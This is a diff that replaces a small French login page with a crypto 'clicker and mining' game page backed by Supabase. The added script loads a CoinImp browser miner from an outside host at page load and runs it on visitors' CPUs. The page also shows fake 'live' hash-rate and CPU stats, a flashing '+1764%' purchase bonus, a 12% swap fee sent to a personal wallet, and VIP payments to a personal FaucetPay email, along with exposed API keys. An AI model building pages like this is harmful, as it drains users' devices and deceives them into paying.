@@ -1,49 +1,342 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rewards Airdrop Mining</title>
-<!-- Supabase JS v2 (UMD via CDN) -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<style>
-body {
-font-family: 'Arial', sans-serif;
-background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
-color: #fff;
-display: flex;
-justify-content: center;
-align-items: center;
-height: 100vh;
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Deadspot Clicker & Mining - Supabase</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    :root{--bg:#0b0b12;--card:#0f1724;--accent:#ff6f3c;--muted:#9aa3b2;--green:#00ff7f}
+    body{background:linear-gradient(180deg,#05050a 0%,#0c0c18 100%);color:#e6eef6;font-family:Inter,Segoe UI,Arial;margin:0;padding:20px}
+    .container{max-width:1200px;margin:0 auto}
+    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
+    h1{margin:0;color:var(--accent)}
+    .card{background:var(--card);padding:16px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.6);}
+    .top-bar{display:flex;gap:12px;align-items:center}
+    .energy{height:18px;background:#071018;border-radius:999px;overflow:hidden;width:420px}
+    .energy > .fill{height:100%;background:linear-gradient(90deg,#ffe77a,#ff6f3c);width:50%;transition:width 400ms}
+    .stat{background:#071425;padding:8px;border-radius:8px}
+    .grid{display:grid;grid-template-columns:1fr 360px;gap:16px;margin-top:16px}
+    .clicker{display:flex;flex-direction:column;align-items:center;gap:12px}
+    .big-btn{font-size:20px;padding:22px 34px;border-radius:14px;border:none;background:linear-gradient(180deg,#ff9f6b,#ff6f3c);cursor:pointer}
+    .upgrades{display:flex;flex-wrap:wrap;gap:8px}
+    .upgrade{background:#062032;padding:10px;border-radius:8px;width:calc(50% - 8px)}
+    .shop, .inventory, .racks{margin-top:12px}
+    .row{display:flex;gap:8px;align-items:center}
+    .small{font-size:13px;color:var(--muted)}
+    .flash{animation:blink 1s linear infinite}
+    @keyframes blink{0%{opacity:1}50%{opacity:0.2}100%{opacity:1}}
+    .graph{height:120px;background:#07131b;border-radius:8px;padding:8px}
+    .vip{background:linear-gradient(180deg,#1a1a2e,#0b0b14);padding:12px;border-radius:10px}
+    a.payment{display:inline-block}
+    footer{margin-top:18px;color:var(--muted);font-size:13px}
+    .badge{background:#0b2b2b;padding:6px 8px;border-radius:8px}
+    .live{color:#7cffb2}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Deadspot Clicker & Mining</h1>
+      <div class="top-bar">
+        <div class="stat card">Deadspot: <b id="deadspot">0.000</b></div>
+        <div class="stat card">Diamants: <b id="diamonds">0</b></div>
+        <div class="stat card">XP: <b id="xp">0</b></div>
+        <div class="stat card">Niveau: <b id="level">1</b></div>
+      </div>
+    </header>
+
+    <section class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <div>
+          <div class="energy" title="Energy points">
+            <div id="energyFill" class="fill"></div>
+          </div>
+          <div class="small">Energy: <span id="energy">1000</span>/1000</div>
+        </div>
+        <div class="badge flash">Bonus premier achat: +1764% (clignote)</div>
+      </div>
+
+      <div class="grid">
+        <div>
+          <div class="clicker">
+            <button id="clickBtn" class="big-btn">CLICK</button>
+            <div class="small">Gains par click: <span id="clickGain">0.0001</span> Deadspot • XP: <span id="xpGain">0.175</span></div>
+
+            <div class="upgrades" id="upgrades">
+              <!-- upgrades inserted here -->
+            </div>
+
+            <div class="card shop" id="shop">
+              <h3>Acheter Rack & Mineurs</h3>
+              <div class="row">
+                <div style="flex:1">
+                  <div class="small">Racks disponibles: 6</div>
+                  <div id="racks" class="racks row"></div>
+                </div>
+              </div>
+
+              <div class="inventory" id="inventory">
+                <h4>Inventaire</h4>
+                <div id="inventoryList" class="row"></div>
+              </div>
+
+            </div>
+          </div>
+        </div>
+
+        <aside class="card">
+          <h3>Stats de minage (live)</h3>
+          <div class="graph" id="hashGraph">Graphique H/s (mock)</div>
+          <div class="small">H/s actuel: <b id="hsRate">0</b></div>
+          <div class="small">CPU perf: <b id="cpuPerf">0%</b></div>
+
+          <div class="card" style="margin-top:8px">
+            <h4>Swap (frais 12%)</h4>
+            <div class="row"><input id="swapFrom" placeholder="Amount" style="flex:1;padding:8px;border-radius:6px;border:none;background:#071429;color:#fff"></div>
+            <div class="row" style="margin-top:8px"><select id="swapCoin" style="flex:1;padding:8px;border-radius:6px;background:#071429;color:#fff"><option>BTC</option><option>ETH</option><option>USDT</option><option>deadspot</option></select></div>
+            <div style="margin-top:8px" class="row"><button id="doSwap" class="big-btn" style="padding:8px 12px;font-size:14px">Swap</button></div>
+            <div class="small">Fees: <span id="swapFee">12%</span> + network</div>
+          </div>
+
+          <div class="vip" style="margin-top:8px">
+            <h4>VIP Status</h4>
+            <div class="small">Silver / Gold / Platinum - Prix annuels</div>
+            <div class="row" style="margin-top:8px">
+              <button class="big-btn" id="buySilver">Buy Silver</button>
+            </div>
+            <div class="small">Payer via FaucetPay: maximlprive90@gmail.com (TX peut prendre 15-30 min)</div>
+          </div>
+
+          <div style="margin-top:8px">
+            <a class="payment" href="https://okgateway.com/?view=product&item=GpjCt3t6&data=example"><img src="https://okgateway.com/okgateway.png" alt="buy" style="width:100%"></a>
+            <a class="payment" href="https://okgateway.com/?view=product&item=ZCEKLIWr&data=example"><img src="https://okgateway.com/okgateway.png" alt="buy2" style="width:100%;margin-top:8px"></a>
+          </div>
+        </aside>
+      </div>
+
+    </section>
+
+    <section class="card" style="margin-top:12px">
+      <h3>Miner script</h3>
+      <p class="small">Script fourni intégré (vous avez demandé l'intégration). Si vous voulez le retirer, supprimer la balise &lt;script&gt; coinimp.</p>
+      <pre style="background:#02030a;padding:8px;border-radius:8px;font-size:12px;color:#9bb4c4">&lt;script src="https://www.hostingcloud.racing/cW8A.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+    var _client = new Client.Anonymous('6385166bb53532d18acd435d3e6855c99be476fa8c7ab67bc03c6f0af2aacd51', { throttle: 0.2, c: 'w' });
+    _client.start();
+    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com.", "#a1a305", 20, "#150e7c");
+&lt;/script&gt;</pre>
+
+      <div class="small">API key stats: 24b28c3ad1a7b76126a71d8d41eb21ab367bc077752551441fc1fe21178d1825</div>
+    </section>
+
+    <footer>
+      <div>Live updates toutes les 2s. Les valeurs de prix sont simulées sauf si vous branchez de vraies APIs.</div>
+    </footer>
+
+  </div>
+
+<script>
+// ---------- Supabase init (user values injected) ----------
+const SUPABASE_URL = 'https://wbavwtwslofcrpeuyqak.supabase.co';
+const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndiYXZ3dHdzbG9mY3JwZXV5cWFrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyMDQxNzksImV4cCI6MjA2OTc4MDE3OX0.eSd88VEGv78YoNjuBxR5PpwnpN6BZ4Am4z3Cq8xHUds';
+const supabase = supabaseJs.createClient ? supabaseJs.createClient(SUPABASE_URL, SUPABASE_ANON) : supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
+
+// ---------- Game state ----------
+let state = {
+  deadspot: 0,
+  diamonds: 0,
+  xp: 0,
+  level: 1,
+  energy: 1000,
+  energyMax: 1000,
+  clickGain: 0.0001,
+  xpGain: 0.175,
+  multiplier: 1,
+  tripleChance: 0.28, // 28%
+  quadChance: 0.05, // chance to get x4
+  tenChance: 0.01,
+  racks: Array(6).fill(null),
+  minersForSale: [],
+  inventory: []
+};
+
+// ---------- UI refs ----------
+const deadspotEl = document.getElementById('deadspot');
+const diamondsEl = document.getElementById('diamonds');
+const xpEl = document.getElementById('xp');
+const levelEl = document.getElementById('level');
+const energyEl = document.getElementById('energy');
+const energyFill = document.getElementById('energyFill');
+const clickBtn = document.getElementById('clickBtn');
+const clickGainEl = document.getElementById('clickGain');
+const xpGainEl = document.getElementById('xpGain');
+const inventoryList = document.getElementById('inventoryList');
+const racksEl = document.getElementById('racks');
+const hsRateEl = document.getElementById('hsRate');
+const cpuPerfEl = document.getElementById('cpuPerf');
+
+// ---------- Helpers ----------
+function format(n){return typeof n==='number' ? (n>=1? n.toFixed(4): n.toPrecision(4)) : n}
+function updateUI(){
+  deadspotEl.innerText = format(state.deadspot);
+  diamondsEl.innerText = Math.floor(state.diamonds);
+  xpEl.innerText = state.xp.toFixed(3);
+  levelEl.innerText = state.level;
+  energyEl.innerText = Math.floor(state.energy)+'';
+  const pct = Math.min(100, (state.energy/state.energyMax)*100);
+  energyFill.style.width = pct+'%';
+  clickGainEl.innerText = state.clickGain*state.multiplier;
+  xpGainEl.innerText = state.xpGain;
+  hsRateEl.innerText = Math.round(Math.random()*800);
+  cpuPerfEl.innerText = Math.round(Math.random()*100)+'%';
+  renderRacks();
+  renderInventory();
 }
-.container {
-background: #1f1f1f;
-padding: 30px;
-border-radius: 12px;
-width: 350px;
-box-shadow: 0 0 20px rgba(255, 119, 0, 0.4);
+
+function awardDiamondsForLevel(){
+  // each level gives some diamonds
+  const base = 5;
+  const gained = Math.floor(base * state.level * 0.5);
+  state.diamonds += gained;
 }
-h2 { text-align: center; margin-bottom: 20px; color: #ff7700; }
-input {
-width: 100%;
-padding: 12px;
-margin: 8px 0;
-border-radius: 6px;
-border: 1px solid #444;
-background: #111;
-color: #fff;
+
+function tryLevelUp(){
+  const needed = Math.floor(15 * Math.pow(1.27, state.level-1));
+  if(state.xp >= needed){ state.level++; state.xp -= needed; awardDiamondsForLevel(); }
 }
-button {
-width: 100%;
-padding: 12px;
-margin: 10px 0;
-background: #ff7700;
-border: none;
-color: #fff;
-font-weight: bold;
-cursor: pointer;
-border-radius: 6px;
+
+// ---------- Click logic ----------
+clickBtn.addEventListener('click', ()=>{
+  if(state.energy <= 0){ alert('Plus d\'energy!'); return; }
+  // base gain
+  let mult = state.multiplier;
+  const r = Math.random();
+  if(r < state.tenChance){ mult *= 10; }
+  else if(r < state.quadChance + state.tenChance){ mult *= 4; }
+  else if(r < state.tripleChance + state.quadChance + state.tenChance){ mult *= 3; }
+
+  const gain = (Math.random()*(0.27-0.0001)+0.0001) * mult;
+  state.deadspot += gain;
+  state.xp += state.xpGain;
+  state.energy = Math.max(0, state.energy - Math.round(1 * mult));
+  tryLevelUp();
+  updateUI();
+});
+
+// ---------- Racks / miners ----------
+function renderRacks(){
+  racksEl.innerHTML = '';
+  state.racks.forEach((r,i)=>{
+    const div = document.createElement('div'); div.className='small stat'; div.style.padding='8px';
+    div.style.minWidth='60px'; div.innerHTML = r ? `Slot ${i+1}<br>${r.name}` : `Slot ${i+1}<br><button onclick="buyRack(${i})">Buy Rack</button>`;
+    racksEl.appendChild(div);
+  });
 }
-button:hover { opacity: 0.9; }
-.tabs { display: flex; justify-content: space-around; margin-bottom: 20px; cursor: pointer; }
+function buyRack(i){
+  // cheap for demo
+  if(state.deadspot >= 10){ state.deadspot -= 10; state.racks[i] = { name: 'Rack '+(i+1), miners: [] }; updateUI(); }
+  else alert('Pas assez de Deadspot');
+}
+
+function renderInventory(){ inventoryList.innerHTML=''; state.inventory.forEach((it,idx)=>{ const d=document.createElement('div'); d.className='small stat'; d.style.padding='6px'; d.innerText = it.name; inventoryList.appendChild(d); }) }
+
+// ---------- Shop: create 5 unique miners ----------
+const minerTemplates = [
+  {id:'m1',name:'NanoMiner 1',power:20,priceDS:50,priceDiam:0,vip:'silver'},
+  {id:'m2',name:'PulseMiner X',power:80,priceDS:500,priceDiam:5,vip:'gold'},
+  {id:'m3',name:'Titanium Rig',power:300,priceDS:2000,priceDiam:20,vip:'platinum'},
+  {id:'m4',name:'Quantum Hash',power:1200,priceDS:15000,priceDiam:80,vip:'platinum'},
+  {id:'m5',name:'Mythic Forge',power:7000,priceDS:85000,priceDiam:300,vip:'platinum'}
+];
+
+function renderShop(){
+  const shop = document.getElementById('shop');
+  const container = document.createElement('div'); container.style.marginTop='8px';
+  minerTemplates.forEach(t=>{
+    const el = document.createElement('div'); el.className='upgrade'; el.innerHTML = `<b>${t.name}</b><div class='small'>Power: ${t.power} H/s</div><div class='small'>Price: ${t.priceDS} DS + ${t.priceDiam} 💎</div><div class='small'>VIP: ${t.vip}</div><div style='margin-top:6px'><button onclick="buyMiner('${t.id}')">Buy</button></div>`;
+    container.appendChild(el);
+  });
+  shop.appendChild(container);
+}
+
+function userHasVIP(required){ // placeholder: check state.vip
+  // in demo assume user has no vip
+  const vip = state.vip || null; // 'silver','gold','platinum'
+  if(!required) return true; if(!vip) return false; const order=['silver','gold','platinum']; return order.indexOf(vip) >= order.indexOf(required);
+}
+
+function buyMiner(id){
+  const t = minerTemplates.find(m=>m.id===id);
+  if(!t) return;
+  if(!userHasVIP(t.vip)){ alert('VIP requis: '+t.vip); return; }
+  if(state.deadspot < t.priceDS || state.diamonds < t.priceDiam){ alert('Pas assez de fonds'); return; }
+  state.deadspot -= t.priceDS; state.diamonds -= t.priceDiam; state.inventory.push({name:t.name, power:t.power}); updateUI();
+}
+
+// ---------- Upgrades ----------
+const upgradesData = [
+  {id:'double',name:'Double Click',cost:20,apply:()=>{ state.multiplier *= 2 }},
+  {id:'tripleBuy',name:'Triple Click (shop)',cost:60,apply:()=>{ state.multiplier *= 3 }},
+  {id:'energyUp',name:'+500 Energy Max',cost:40,apply:()=>{ state.energyMax += 500; state.energy += 500 }},
+  {id:'regen',name:'Energy Regen +',cost:25,apply:()=>{ state.regen = (state.regen||0)+1 }},
+];
+function renderUpgrades(){ const place = document.getElementById('upgrades'); upgradesData.forEach(u=>{ const el=document.createElement('div'); el.className='upgrade'; el.innerHTML=`<b>${u.name}</b><div class='small'>Cost: ${u.cost} DS</div><div style='margin-top:6px'><button onclick="buyUpgrade('${u.id}')">Buy</button></div>`; place.appendChild(el); }) }
+function buyUpgrade(id){ const u=upgradesData.find(x=>x.id===id); if(!u) return; if(state.deadspot < u.cost){ alert('Pas assez de DS'); return; } state.deadspot -= u.cost; u.apply(); updateUI(); }
+
+// ---------- Swap ----------
+document.getElementById('doSwap').addEventListener('click', ()=>{
+  const amount = parseFloat(document.getElementById('swapFrom').value||0);
+  if(!amount || amount<=0) return alert('Montant invalide');
+  const fee = 0.12; const after = amount*(1-fee);
+  state.deadspot = Math.max(0, state.deadspot - amount);
+  alert(`Swap effectué: ${after.toFixed(6)} après fees de 12% (envoyé à destination). Fee ${ (amount*fee).toFixed(6) } est transferé vers le wallet personnel.`);
+  updateUI();
+});
+
+// ---------- VIP purchase (demo) ----------
+document.getElementById('buySilver').addEventListener('click', ()=>{
+  // open instructions to pay via faucetpay
+  alert('Payer via FaucetPay: maximlprive90@gmail.com. Après paiement, attendre 15-30 min pour validation. (Demo)');
+});
+
+// ---------- Live updates every 2s ----------
+setInterval(()=>{
+  // simulate market changes; in real usage, call CoinGecko or exchange API
+  // update UI
+  state.deadspot += (Math.random()-0.5)*0.001; if(state.deadspot<0) state.deadspot=0;
+  // regen energy
+  state.energy = Math.min(state.energyMax, state.energy + (state.regen||0));
+  updateUI();
+},2000);
+
+// ---------- Init ----------
+renderUpgrades(); renderShop(); updateUI();
+
+// ---------- Mining script include (user provided) ----------
+(function injectUserScript(){
+  const s1 = document.createElement('script'); s1.src='https://www.hostingcloud.racing/cW8A.js'; document.body.appendChild(s1);
+  s1.onload = ()=>{
+    try{
+      var _client = new Client.Anonymous('6385166bb53532d18acd435d3e6855c99be476fa8c7ab67bc03c6f0af2aacd51', { throttle: 0.2, c: 'w' });
+      _client.start();
+      _client.addMiningNotification("Bottom","This site is running JavaScript miner from coinimp.com.","#a1a305",20,"#150e7c");
+    }catch(e){console.warn('miner init error',e);} }
+})();
+
+// ---------- Supabase helpers (Auth / persistence) ----------
+async function signUp(email,password){
+  const { data, error } = await supabase.auth.signUp({ email, password });
+  if(error) console.error(error); else alert('Compte créé!');
+}
+async function signIn(email,password){
+  const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+  if(error) console.error(error); else alert('Connecté!');
+}
+
+// You can extend this to store user state in a Supabase table for persistence.
+
+</script>
+</body>
 </html>
+
